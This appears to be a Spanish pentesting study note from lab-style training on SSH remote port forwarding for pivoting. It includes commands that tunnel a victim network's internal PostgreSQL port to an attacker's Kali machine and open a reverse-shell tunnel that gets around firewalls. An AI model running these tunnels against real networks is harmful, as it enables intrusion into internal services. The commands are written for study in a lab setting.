
## DESCRIPTION

Esto es más desafiante en el mundo real porque, en la mayoría de los casos, es probable que los firewalls, tanto de hardware como de software, se interpongan en el camino. El tráfico entrante a menudo se controla mucho más agresivamente que el tráfico _saliente_ . Solo en casos excepcionales comprometeremos las credenciales de un usuario de NSSH, lo que nos permitirá conectar SSH directamente a una red y reenviar el puerto. Muy rara vez podremos acceder a los puertos que vinculamos a un perímetro de red.

Desde dentro se conectan a nuestra maquina

![[Pasted image 20230529193914.png]]
#### Mas información
* 


## EXPLOITATION

### OPTION 1: EN KALI

1. Arrancamos ssh

```
sudo systemctl start ssh
```


### DESDE LA VICTIMA (PUENTE)

En este caso, queremos escuchar en el puerto **2345** en nuestra máquina Kali ( **127.0.0.1:2345** ) y reenviar todo el tráfico al puerto PostgreSQL en PGDATABASE01 ( **10.4.50.215:5432** ).

```
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```


![[Pasted image 20230529191520.png]]


### OPTION 2: POR EJEMPLO SI QUEREMOS ESTABLECERNOS UNA REVERSE SHELL

![[Pasted image 20230606182143.png]]

```
ssh -R 10.10.140.147:3213:192.168.45.228:9898 web_svc@192.168.250.147
```
## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 